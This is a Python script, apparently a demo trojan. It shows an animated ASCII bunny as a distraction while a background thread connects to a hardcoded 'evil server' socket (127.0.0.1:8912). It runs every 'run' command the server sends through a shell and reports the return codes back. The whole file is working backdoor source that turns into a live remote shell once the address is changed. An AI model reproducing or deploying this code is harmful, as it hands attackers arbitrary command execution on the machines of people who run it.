import time
import socket
import threading
import sys
import subprocess

############################################################################

evilBunnyServerIP   = "127.0.0.1"
evilBunnyServerPort = 8912
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

############################################################################

def main():
   
    # Start a thread that displays an animated ascii bunny
    threading.Thread(target=evil_bunny, args=()).start()
    
    # Establish TCP socket with the distant server
    try:
        sock.connect(( evilBunnyServerIP, evilBunnyServerPort ))
    
    except:
        print("Something wrong happened. Failed to connect to evil server ?")
        sys.exit()

    threading.Thread(target=server_handler, args=()).start()

    # Infinite loop so that the program and thread keeps running
    while True:
        pass

def server_handler():
    '''print out and execute commands from evil server'''
    execute_from_evil_server()


def execute_from_evil_server():
    ''' get instructions, execute and send back return value'''
    while True:
        data = sock.recv(1024)
        print("[Server] {}".format(data.decode('utf-8')))
        test = data.decode('utf-8').split(',')
        if test[0] == 'run':
            return_val = subprocess.run(" ".join(test[1:]),shell=True).returncode

        elif test[0] == 'exit':
            sock.send("quitting".encode('utf-8'))
            sys.exit()

        else:
            return_val = 0

        sock.send(str(return_val).encode('utf-8'))


def evil_bunny():
    ''' place holder for expected behaviour'''
    while True:

        for i in range(10):
            print()
            
        print("""
           \`\ /`/
            \ V /               
            /. .\       
           =\ ~ /=                  
            / ^ \     
         {}/\\\\ //\\
         __\ " " /__           
        (____/^\____)
        """)
       
        time.sleep(5)

        for i in range(10):
            print()
     
        print("""
           \`\ /`/
            \ V /               
            /. .\       
           =\ v /=                  
            / ^ \     
         {}/\\\\ //\\
           \ " " /
           / / \\ \\
          / /   \\ \\
          `-     `-`
        """)

        time.sleep(1)


if __name__ == '__main__':
  main()

